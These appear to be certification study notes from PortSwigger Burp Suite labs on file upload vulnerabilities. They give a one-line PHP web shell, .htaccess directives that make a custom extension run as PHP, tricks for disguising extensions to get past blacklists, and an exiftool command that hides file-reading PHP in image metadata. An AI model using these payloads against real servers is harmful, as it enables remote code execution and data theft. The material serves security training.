##### PortSwigger BurpSuite Certification Summary
# File Upload Vulnerability
Being able to upload files to a web server poses a great security risk if not handled correctly, especially if there is a way for the attacker to execute code on the web server.

As so often, the client might be able to manipulate data in a way that was not intended. This includes altering the file type (as it is shown in the request) so the backend's white/blacklisting doesn't interfere with the upload. Because of this, it is detrimental to properly check the file for the correct type.

#### PHP
Execute arbitrary shell command by providing the argument `GET /exploit.php?command=id`
```
<?php echo system($_GET['command']); ?>
```
#### Apache 
The apache server utilizes config files in order to determine how a file is handled. It is there where it's specified if a file is run on the server, thus an attacker controlling a config will be able to make their own file executable.
The local config file `.htaccess` is best suited to do so, as it overrides the global config and is usually easier to create/alter than the one in `/etc/apache2/apache2.conf`.

To execute `php` , the module has to be loader first. With `AddType` arbitrary file extensions can be mapped to an existing one, which will be then handled as such.
```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .l33t
```
In the example, all files with the extension `.l33t` will be reagarded as php files and executed as such.

The same principle with the local configs applies for **IIS** which uses `web.config`.

## Obfuscating the File Extension
There are several ways of obfuscating the file names in a way that it passes the blacklist and is still executed the way it is intended (maliciously):
  * Multiple extensions `exploit.php.jpg`
  * Trailing characters (whitespace, dot, etc.)
  * URL encode (once or twice) special characters
  * Add a semicolon or null byte character before the extension 
  * Separate with a semicolon or null byte (`exploit.php%00.png` )
  * Using multibyte unicode characters (`xC0 x2E | xC4 xAE | xC0 xAE`)
  * Repeat string to abuse non-recursive stripping (`exploit.p.phphp`)

## Hide the Code
If the server checks the file content for actual correctness (e.g. that it is indeed an image and not code), the metadata can be used to hide the code within a valid file. This creates a so-called *polyglot* file, which can be "easily" created with the `ExifTool`:
```
exiftool -Comment="
<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>"
<YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```
## Try PUT
Even if there is no button for a file upload, it might be possible to upload it through a PUT request. The OPTIONS request to different endpoints can reveal if PUT is supported.